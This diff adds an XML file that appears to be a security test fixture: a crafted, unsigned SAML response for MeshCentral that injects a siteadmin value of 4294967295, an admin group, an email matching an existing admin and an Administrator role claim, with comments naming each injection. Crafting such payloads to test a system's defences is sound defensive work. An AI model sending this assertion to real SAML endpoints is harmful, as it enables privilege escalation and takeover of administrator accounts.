@@ -1,0 +1,48 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- VECTOR: Extra attribute injection — attacker-controlled attributes named 'siteadmin', 'groups', 'email' to influence MeshCentral profile mapping -->
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
+                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
+                ID="_attrinjection001"
+                Version="2.0"
+                IssueInstant="2026-01-01T00:00:00Z"
+                Destination="https://meshcentral.example.com/auth-saml-callback">
+  <saml:Issuer>https://idp.example.com/saml</saml:Issuer>
+  <samlp:Status>
+    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
+  </samlp:Status>
+  <saml:Assertion ID="_assertion_attr" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">
+    <saml:Issuer>https://idp.example.com/saml</saml:Issuer>
+    <saml:Subject>
+      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">attacker@evil.com</saml:NameID>
+      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
+        <saml:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00Z"
+                                      Recipient="https://meshcentral.example.com/auth-saml-callback"/>
+      </saml:SubjectConfirmation>
+    </saml:Subject>
+    <saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z">
+      <saml:AudienceRestriction>
+        <saml:Audience>meshcentral</saml:Audience>
+      </saml:AudienceRestriction>
+    </saml:Conditions>
+    <saml:AttributeStatement>
+      <!-- Attempt to inject MeshCentral-internal field names as SAML attributes -->
+      <saml:Attribute Name="siteadmin">
+        <saml:AttributeValue>4294967295</saml:AttributeValue>
+      </saml:Attribute>
+      <saml:Attribute Name="groups">
+        <saml:AttributeValue>site-admin-group</saml:AttributeValue>
+      </saml:Attribute>
+      <!-- Override email to match an existing admin account -->
+      <saml:Attribute Name="email">
+        <saml:AttributeValue>admin@corp.com</saml:AttributeValue>
+      </saml:Attribute>
+      <saml:Attribute Name="displayname">
+        <saml:AttributeValue>Injected Admin</saml:AttributeValue>
+      </saml:Attribute>
+      <!-- Try passport-saml's internal field names -->
+      <saml:Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/role">
+        <saml:AttributeValue>Administrator</saml:AttributeValue>
+      </saml:Attribute>
+    </saml:AttributeStatement>
+  </saml:Assertion>
+</samlp:Response>
